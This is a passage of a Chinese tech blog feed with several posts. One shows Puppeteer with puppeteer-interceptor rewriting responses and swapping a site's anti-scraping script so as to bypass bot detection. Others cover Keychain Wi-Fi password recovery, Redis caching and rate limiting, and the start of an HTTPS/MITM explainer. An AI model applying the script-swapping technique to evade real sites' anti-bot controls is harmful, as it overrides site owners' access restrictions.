class="line">    <span class="keyword">await</span> page.goto(<span class="string">'http://exercise.kingname.info/exercise_ajax_1.html'</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-05-19-57-05.png" alt></p><p>现在，我想拦截网站返回的数据，并篡改它。首先我们打开 Chrome 的开发者工具，看看这个页面有哪些 Ajax 请求：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-05-19-58-54.png" alt></p><p>红框框住的这个 Ajax 请求，返回了网页上面的文字。这个请求对应的地址是：<code>http://exercise.kingname.info/ajax_1_backend</code>，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-05-19-59-51.png" alt></p><p>现在，我们就来尝试篡改这个请求的返回数据。首先使用<code>npm</code>安装一个包：<code>npm install puppeteer-interceptor</code>。然后修改代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer-core'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; intercept, patterns &#125; = <span class="built_in">require</span>(<span class="string">'puppeteer-interceptor'</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123;</span><br><span class="line">        executablePath: <span class="string">'/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge'</span>,</span><br><span class="line">        headless:<span class="literal">false</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> [page] = <span class="keyword">await</span> browser.pages();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    intercept(page, patterns.XHR(<span class="string">'*ajax_1_backend'</span>), &#123;</span><br><span class="line">        onResponseReceived: <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;event.request.url&#125;</span> intercepted, going to modify`</span>)</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">`You are hacked by me`</span>;</span><br><span class="line">            event.response.body = content;</span><br><span class="line">            <span class="keyword">return</span> event.response;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">'http://exercise.kingname.info/exercise_ajax_1.html'</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-05-20-06-35.png" alt></p><p>其中关键的代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">intercept(page, patterns.XHR(<span class="string">'*ajax_1_backend'</span>), &#123;</span><br><span class="line">        onResponseReceived: <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;event.request.url&#125;</span> intercepted, going to modify`</span>)</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">`You are hacked by me`</span>;</span><br><span class="line">            event.response.body = content;</span><br><span class="line">            <span class="keyword">return</span> event.response;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>这一段代码指定，要修改一个 XHR 请求的返回。这个 XHR 请求的 URL 是以<code>ajax_1_backend</code>结尾的。所谓的 XHR 请求，全称是<code>XMLHttpRequest</code>，大家可以把它近似看做 Ajax 请求。</p><p>当检测到满足这个通配符的请求时，无论它的内容是什么，都改写成<code>You are hacked by me</code>，然后返回给浏览器。</p><p>有人可能会问，你这样修改，简单是简单，但它有什么用呢？它的用处非常大，比如你在做爬虫的时候，把网站的 JavaScript 的一部分代码替换了，这样就能绕过反爬虫检测。</p><p>我做了一个示例的页面来说明。这个页面直接访问，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-05-20-26-57.png" alt></p><p>使用开发者工具，我们可以看到核心的反爬虫逻辑在<code>http://127.0.0.1:8000/backend.js</code>这个 js 文件中，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-05-20-29-35.png" alt></p><p>这个演示的例子中，这个反爬虫函数非常简单。但在真实的场景中，它的逻辑非常复杂。然而，逻辑再复杂，也有个调用入口。简单分析这个JavaScript 代码，我们可以知道，只需要把代码第14行注释掉，强制设置<code>is_spider = false</code>，就可以绕过这个反爬虫逻辑了。</p><p>为了绕过反爬虫逻辑，首先，我们把网站的这个JavaScript 代码复制下来，保存成<code>safe.js</code>文件。然后修改里面的代码，绕过反爬虫逻辑：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">antispider</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'开始检测爬虫'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'开始收集浏览器指纹'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'开始检查是否是模拟浏览器'</span>);</span><br><span class="line">    <span class="keyword">if</span> (a + b === <span class="number">3</span>) &#123;  <span class="comment">// 是爬虫！</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">is_spider = <span class="literal">false</span>;  <span class="comment">//这里强制写成 false</span></span><br><span class="line"><span class="keyword">if</span>(is_spider) &#123;</span><br><span class="line">    alert(<span class="string">'你是爬虫！'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"content"</span>).innerHTML = <span class="string">"In America, leave airplane, inner People, related to the benefit, know everything, know nothing, said nothing, above."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，修改 Puppeteer 的代码，从本地读取这个修改后的 js 文件，然后拦截真正的请求并使用修改后的代码替换：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer-core'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; intercept, patterns &#125; = <span class="built_in">require</span>(<span class="string">'puppeteer-interceptor'</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> safe_code = fs.readFileSync(<span class="string">'./safe.js'</span>, <span class="string">'utf8'</span>);</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123;</span><br><span class="line">        executablePath: <span class="string">'/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge'</span>,</span><br><span class="line">        headless:<span class="literal">false</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> [page] = <span class="keyword">await</span> browser.pages();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    intercept(page, patterns.Script(<span class="string">'*backend.js'</span>), &#123;</span><br><span class="line">        onResponseReceived: <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;event.request.url&#125;</span> intercepted, going to modify`</span>)</span><br><span class="line">            event.response.body = safe_code;</span><br><span class="line">            <span class="keyword">return</span> event.response;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">'http://127.0.0.1:8000'</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-05-20-57-28.png" alt></p><p>从图中可以看到，我们成功绕过了反爬虫的逻辑，获得了真正的页面数据。</p><p>这里有两个地方需要注意：</p><ol><li>要拦截哪个请求，对应到的是<code>intercept</code>函数的第二个参数。这个参数的值是<code>patterns.XXX(地址通配符)</code>。其中的 XXX 可以是如下几个关键词：<code>Document, Stylesheet, Image, Media, Font, Script, TextTrack, XHR, Fetch, EventSource, WebSocket, Manifest, SignedExchange, Ping, CSPViolationReport, Preflight, Other</code>。地址通配符注意是<code>通配符</code>不是正则表达式。通配符里面，<code>*</code>表示多个字符，<code>?</code>表示一个字符。</li><li><code>puppeteer-interceptor</code>对中文的支持不太好。拦截到请求返回的数据以后，如果要修改文本，尽量修改成英文的。否则可能会报错。</li></ol><p><code>puppeteer-interceptor</code>不仅可以修改返回的内容，还可以修改网站的请求。更多强大功能，大家可以阅读它的<a href="https://www.npmjs.com/package/puppeteer-interceptor" target="_blank" rel="noopener">官方文档</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在我的爬虫书中，讲到了使用 Charles 或者 MitmProxy 实现中间人攻击，从而绕过反爬虫机制的方法。但这两种方法都需要安装根证书。&lt;/p&gt;
&lt;p&gt;今天，我们来试一试在 Puppeteer 中，使用中间人攻击，攻击目标是我们自己，来绕过反爬虫机制。&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://www.kingname.info/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="中间人攻击" scheme="https://www.kingname.info/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    
      <category term="Puppeteer" scheme="https://www.kingname.info/tags/Puppeteer/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：macOS如何找回已经连接的Wi-Fi密码？</title>
    <link href="https://www.kingname.info/2022/01/18/find-password/"/>
    <id>https://www.kingname.info/2022/01/18/find-password/</id>
    <published>2022-01-18T13:02:04.000Z</published>
    <updated>2022-01-18T13:02:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>我们知道，iPhone之间，iPhone和macOS之间是可以一键分享Wi-Fi密码的。只要有一台手机连了Wi-Fi，那么当第二台手机要连Wi-Fi的时候，只要第一台手机在旁边，就会自动弹出一个是否分享Wi-Fi密码的提示，从而一键分享。</p><p>我的macOS两年前连过父母家的Wi-Fi。后来又通过它的分享功能让iPhone也连上了Wi-Fi。所以两年过去了，Wi-Fi密码早就忘记了。</p><p>现在，我想让一台安卓手机连上这个Wi-Fi应该怎么办呢？</p><a id="more"></a><p>首先尝试了暴力破解。我试了所有我能想到的密码，均告失败。</p><p>接下来我尝试登陆路由器后台，试图从路由器管理页面找到密码。但我发现路由器管理密码也忘记了。</p><p>如果不重置路由器，还有什么办法找回密码呢？</p><p>其实macOS是有办法查到已经连过的Wi-Fi的明文密码，方法非常简单。</p><p>首先在启动台中，找到一个叫做<code>钥匙串访问</code>的功能，如下图所示。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-03-10-23-30.png" alt></p><p>选择<code>系统</code>-<code>密码</code>，然后找到 Wi-Fi的名字，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-03-10-25-15.png" alt></p><p>在Wi-Fi 名字上右键，选择<code>将密码拷贝到剪贴板</code>，并输入电脑的账号和密码，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-03-10-26-45.png" alt></p><p>然后找任何一个可以打字的输入框，粘贴一下，就知道密码是什么了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们知道，iPhone之间，iPhone和macOS之间是可以一键分享Wi-Fi密码的。只要有一台手机连了Wi-Fi，那么当第二台手机要连Wi-Fi的时候，只要第一台手机在旁边，就会自动弹出一个是否分享Wi-Fi密码的提示，从而一键分享。&lt;/p&gt;
&lt;p&gt;我的macOS两年前连过父母家的Wi-Fi。后来又通过它的分享功能让iPhone也连上了Wi-Fi。所以两年过去了，Wi-Fi密码早就忘记了。&lt;/p&gt;
&lt;p&gt;现在，我想让一台安卓手机连上这个Wi-Fi应该怎么办呢？&lt;/p&gt;
    
    </summary>
    
      <category term="技巧" scheme="https://www.kingname.info/categories/%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="技巧" scheme="https://www.kingname.info/tags/%E6%8A%80%E5%B7%A7/"/>
    
      <category term="macOS" scheme="https://www.kingname.info/tags/macOS/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：全文搜索、频率限制、带过期时间的缓存怎么做？</title>
    <link href="https://www.kingname.info/2022/01/03/walrus/"/>
    <id>https://www.kingname.info/2022/01/03/walrus/</id>
    <published>2022-01-03T02:34:04.000Z</published>
    <updated>2022-01-03T02:35:06.580Z</updated>
    
    <content type="html"><![CDATA[<p>在以前的文章里面，我给大家介绍了使用Python自带的LRU缓存实现带有过期时间的缓存：<a href="https://mp.weixin.qq.com/s/idD-i8mGHx9zSBEXYI1QWg" target="_blank" rel="noopener">一日一技：实现有过期时间的LRU缓存</a>。也讲过倒排索引：<a href="https://mp.weixin.qq.com/s/AEDfZLlGcG5cgStCt_ZkeA" target="_blank" rel="noopener">使用倒排索引极速提高字符串搜索效率</a>。但这些代码对初学者来说比较难，写起来可能会出错。</p><p>实际上，这些功能其实都可以使用Redis来实现，而且每个功能只需要1分钟就能做出来。全文搜索功能在搜索英文的时候，甚至可以智能识别拼写错误的问题。</p><a id="more"></a><p>要实现这些功能，只需要做两件事：</p><ol><li>安装Redis</li><li>Python安装第三方库：<code>walrus</code></li></ol><p>安装完成以后，我们来看看它有多简单：</p><h2 id="带过期时间的缓存装饰器"><a href="#带过期时间的缓存装饰器" class="headerlink" title="带过期时间的缓存装饰器"></a>带过期时间的缓存装饰器</h2><p>我们想实现一个装饰器，它装饰一个函数。让我在1分钟内多次访问函数的时候，使用缓存的数据；超过1分钟以后才重新执行函数的内部代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> walrus <span class="keyword">import</span> Database</span><br><span class="line"></span><br><span class="line">db = Database()</span><br><span class="line">cache = db.cache()</span><br><span class="line"></span><br><span class="line"><span class="meta">@cache.cached(timeout=60)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'函数真正运行起来'</span>)</span><br><span class="line">    now = datetime.datetime.now()</span><br><span class="line">    <span class="keyword">return</span> now</span><br><span class="line"></span><br><span class="line">now = test()</span><br><span class="line">print(<span class="string">'函数返回的数据是：'</span>, now)</span><br><span class="line">time.sleep(<span class="number">10</span>) <span class="comment"># 等待10秒，此时会使用缓存</span></span><br><span class="line">print(<span class="string">'函数返回的数据是：'</span>, test())</span><br><span class="line">time.sleep(<span class="number">5</span>) <span class="comment"># 等待5秒，此时依然使用缓存</span></span><br><span class="line">print(<span class="string">'函数返回的数据是：'</span>, test())</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">50</span>)  <span class="comment"># 让时间超过缓存的时间</span></span><br><span class="line">print(<span class="string">'函数返回的数据是：'</span>, test())</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211228185527.png" alt></p><h2 id="全文搜索"><a href="#全文搜索" class="headerlink" title="全文搜索"></a>全文搜索</h2><p>我们再来看看全文搜索功能，实现起来也很简单：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> walrus <span class="keyword">import</span> Database</span><br><span class="line"></span><br><span class="line">db = Database()</span><br><span class="line">search = db.Index(<span class="string">'xxx'</span>)  <span class="comment"># 这个名字随便取</span></span><br><span class="line">poem1 = <span class="string">'Early in the day it was whispered that we should sail in a boat, only thou and I, and never a soul in the world would know of this our pilgrimage to no country and to no end.'</span></span><br><span class="line">poem2 = <span class="string">'Had I the heavens’ embroidered cloths,Enwrought with golden and silver light'</span></span><br><span class="line">poem3 = <span class="string">'to be or not to be, that is a question.'</span></span><br><span class="line"></span><br><span class="line">search.add(<span class="string">'docid1'</span>, poem1) <span class="comment"># 第一个参数不能重复</span></span><br><span class="line">search.add(<span class="string">'docid2'</span>, poem2)</span><br><span class="line">search.add(<span class="string">'docid3'</span>, poem3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> doc <span class="keyword">in</span> search.search(<span class="string">'end'</span>):</span><br><span class="line">    print(doc[<span class="string">'content'</span>])</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211228191027.png" alt></p><p>如果你想让他兼容拼写错误，那么可以把<code>search = db.Index(&#39;xxx&#39;)</code>改成<code>search = db.Index(&#39;xxx’, metaphone=True)</code>，运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211228191314.png" alt></p><p>不过遗憾的是，这个全文搜索功能只支持英文。</p><h2 id="频率限制"><a href="#频率限制" class="headerlink" title="频率限制"></a>频率限制</h2><p>我们有时候要限制调用某个函数的频率，或者网站的某个接口要限制IP的访问频率。这个时候，使用<code>walrus</code>也可以轻松实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> walrus <span class="keyword">import</span> Database</span><br><span class="line"></span><br><span class="line">db = Database()</span><br><span class="line">rate = db.rate_limit(<span class="string">'xxx'</span>, limit=<span class="number">5</span>, per=<span class="number">60</span>) <span class="comment"># 每分钟只能调用5次</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">    <span class="keyword">if</span> rate.limit(<span class="string">'xxx'</span>):</span><br><span class="line">        print(<span class="string">'访问频率太高！'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'还没有触发访问频率限制'</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211228192152.png" alt></p><p>其中参数<code>limit</code>表示能出现多少次，<code>per</code>表示在多长时间内。</p><p><code>rate.limit</code>只要传入相同的参数，那么就会开始检查这个参数在设定的时间内出现的频率。</p><p>你可能觉得这个例子并不能说明什么问题，那么我们跟FastAPI结合一下，用来限制IP访问接口的频率。编写如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> walrus <span class="keyword">import</span> Database, RateLimitException</span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> JSONResponse</span><br><span class="line"></span><br><span class="line">db = Database()</span><br><span class="line">rate = db.rate_limit(<span class="string">'xxx'</span>, limit=<span class="number">5</span>, per=<span class="number">60</span>) <span class="comment"># 每分钟只能调用5次</span></span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.exception_handler(RateLimitException)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_rate_litmit_exception</span><span class="params">(request: Request, exc: RateLimitException)</span>:</span></span><br><span class="line">    msg = &#123;<span class="string">'success'</span>: <span class="literal">False</span>, <span class="string">'msg'</span>: <span class="string">f'请喝杯茶，休息一下，你的ip: <span class="subst">&#123;request.client.host&#125;</span>访问太快了！'</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> JSONResponse(status_code=<span class="number">429</span>, content=msg)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'success'</span>: <span class="literal">True</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get('/important_api')</span></span><br><span class="line"><span class="meta">@rate.rate_limited(lambda request: request.client.host)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query_important_data</span><span class="params">(request: Request)</span>:</span></span><br><span class="line">    data = <span class="string">'重要数据'</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'success'</span>: <span class="literal">True</span>, <span class="string">'data'</span>: data&#125;</span><br></pre></td></tr></table></figure><p>上面代码定义了一个全局的异常拦截器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.exception_handler(RateLimitException)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_rate_litmit_exception</span><span class="params">(request: Request, exc: RateLimitException)</span>:</span></span><br><span class="line">    msg = &#123;<span class="string">'success'</span>: <span class="literal">False</span>, <span class="string">'msg'</span>: <span class="string">f'请喝杯茶，休息一下，你的ip: <span class="subst">&#123;request.client.host&#125;</span>访问太快了！'</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> JSONResponse(status_code=<span class="number">429</span>, content=msg)</span><br></pre></td></tr></table></figure><p>在整个代码的任何地方抛出了<code>RateLimitException</code>异常，就会进入这里的逻辑中。</p><p>使用装饰器<a href="mailto:`@rate.rat" target="_blank" rel="noopener">`@rate.rat</a>e_limited<code>装饰一个路由函数，并且这个装饰器要更靠近函数。路由函数接收什么参数，它就接收什么参数。在上面的例子中，我们只接收了</code>request<code>参数，用于获取访问者的IP。发现这个IP的访问频率超过了限制，就抛出一个</code>RateLimitException<code>。于是前面定义好的全局拦截器就会拦截</code>RateLimitException`异常，拦截到以后返回我们定义好的报错信息。</p><p>在频率范围内访问页面，返回正常的JSON数据：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211228205416.png" alt></p><p>频率超过设定的值以后，访问页面就会报错，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211228205337.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>walrus</code>对<code>redis-py</code>进行了很好的二次封装，用起来非常顺手。除了上面我提到的三个功能外，它还可以实现几行代码生成布隆过滤器，实现自动补全功能，实现简易图数据库等等。大家可以访问它的<a href="https://walrus.readthedocs.io/en/latest/getting-started.html" target="_blank" rel="noopener">官方文档了解详细使用说明</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在以前的文章里面，我给大家介绍了使用Python自带的LRU缓存实现带有过期时间的缓存：&lt;a href=&quot;https://mp.weixin.qq.com/s/idD-i8mGHx9zSBEXYI1QWg&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;一日一技：实现有过期时间的LRU缓存&lt;/a&gt;。也讲过倒排索引：&lt;a href=&quot;https://mp.weixin.qq.com/s/AEDfZLlGcG5cgStCt_ZkeA&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;使用倒排索引极速提高字符串搜索效率&lt;/a&gt;。但这些代码对初学者来说比较难，写起来可能会出错。&lt;/p&gt;
&lt;p&gt;实际上，这些功能其实都可以使用Redis来实现，而且每个功能只需要1分钟就能做出来。全文搜索功能在搜索英文的时候，甚至可以智能识别拼写错误的问题。&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://www.kingname.info/categories/Python/"/>
    
    
      <category term="Redis" scheme="https://www.kingname.info/tags/Redis/"/>
    
      <category term="全文搜索" scheme="https://www.kingname.info/tags/%E5%85%A8%E6%96%87%E6%90%9C%E7%B4%A2/"/>
    
      <category term="缓存" scheme="https://www.kingname.info/tags/%E7%BC%93%E5%AD%98/"/>
    
      <category term="频率控制" scheme="https://www.kingname.info/tags/%E9%A2%91%E7%8E%87%E6%8E%A7%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>HTTPS 证书和中间人攻击的原理</title>
    <link href="https://www.kingname.info/2021/12/23/reason-for-mitm/"/>
    <id>https://www.kingname.info/2021/12/23/reason-for-mitm/</id>
    <published>2021-12-23T03:04:04.000Z</published>
    <updated>2021-12-23T03:05:23.644Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-17-02-03.png" alt="香格里拉古镇里面的牛肉火锅"></p><p>有同学在知识星球和公众号粉丝群里面提到，希望我讲一讲 HTTPS 证书、为什么使用 Charles、Fiddler、MitmProxy 抓 HTTPS 的请求要安装证书、 requests 发送请求的时候，verify 参数除了 False/True 还能填写什么参数。今天我们就这几个问题来做一个简单的介绍。</p><a id="more"></a><p>首先我们定义几个术语：</p><ul><li>公钥：一串字符串，在非对称加密里面用来加密数据，随意公开。</li><li>私钥：一串字符串，在非对称加密里面用来解密数据，不能泄露。根据私钥可以反推出公钥。</li><li>普通密钥：一串字符串。在对称加密里面，加密和解密都用它。</li></ul><p>首先关于HTTPS 链接的创建流程，网上已经有太多文章来介绍了。网上给出的流程，大概是这样的：</p><ol><li>客户端发送请求到服务器。</li><li>服务器把自己的公钥下发给客户端。</li><li>客户端使用这个公钥加密一个普通的密钥，并发送给服务器。</li><li>服务器使用私钥解密出这个普通的密钥。</li><li>接下来所有的请求都由这个普通的密钥通过对称加密来实现。</li></ol><p>并且，这些文章一般还会说道，对称加密速度快，但是加密解密使用的是同一个密钥。当你要传输这个密钥的时候可能会泄露；非对称加密，公钥可以随意公开，公钥加密，私钥解密。安全性高但是速度慢。所以 HTTPS 使用非对称加密用来传输普通密钥。这个普通密钥再来传输正常的数据。</p><p>这个流程看起来没有什么问题，也很合理。但是，它漏掉了一个很重要的东西：如何识别信息有没有被篡改或者监听？</p><p>我们说 HTTPS 